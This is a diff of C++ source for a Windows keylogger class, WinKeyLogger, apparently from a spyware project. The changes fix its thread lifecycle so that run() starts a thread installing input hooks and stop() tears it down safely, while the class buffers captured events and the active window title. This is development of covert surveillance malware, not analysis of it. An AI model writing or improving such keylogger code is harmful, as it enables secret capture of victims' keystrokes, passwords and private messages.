@@ -28,15 +28,13 @@ namespace spi
             _sharedInstance = this;
         }
 
-        ~WinKeyLogger() override = default;
+        ~WinKeyLogger() noexcept override
+        {
+            stop();
+        }
 
         bool setup() noexcept override
         {
-            _thread = new std::thread{([this]() {
-                setupHooks();
-                while (_threadLoop && GetMessage(nullptr, nullptr, 0, 0));
-                removeHooks();
-            })};
             return true;
         }
 
@@ -335,18 +333,28 @@ namespace spi
 
         void run() override
         {
-            _log(logging::Info) << "Running..." << std::endl;
-            _service->get().post(boost::bind(&WinKeyLogger::threadFunction, this));
+            if (!_threadLoop) {
+                _threadLoop = true;
+                _thread = new std::thread{([this]() {
+                    setupHooks();
+                    while (_threadLoop && GetMessage(nullptr, nullptr, 0, 0));
+                    removeHooks();
+                })};
+                _log(logging::Info) << "Running..." << std::endl;
+                _service->get().post(boost::bind(&WinKeyLogger::threadFunction, this));
+            }
         }
 
         void stop() override
         {
-            _threadLoop = false;
-            if (_thread->joinable()) {
-                _thread->join();
+            if (_threadLoop) {
+                _threadLoop = false;
+                if (_thread != nullptr && _thread->joinable()) {
+                    _thread->join();
+                }
+                delete _thread;
+                // KILL THREAD
             }
-            delete _thread;
-            // KILL THREAD
         }
 
     private:
@@ -358,7 +366,7 @@ namespace spi
         boost::circular_buffer<Events> _circularBuffer;
         std::mutex _bufferMutex;
 
-        std::atomic<bool> _threadLoop{true};
+        std::atomic<bool> _threadLoop{false};
         std::thread *_thread;
 
         std::string _activeWindowTitle{};
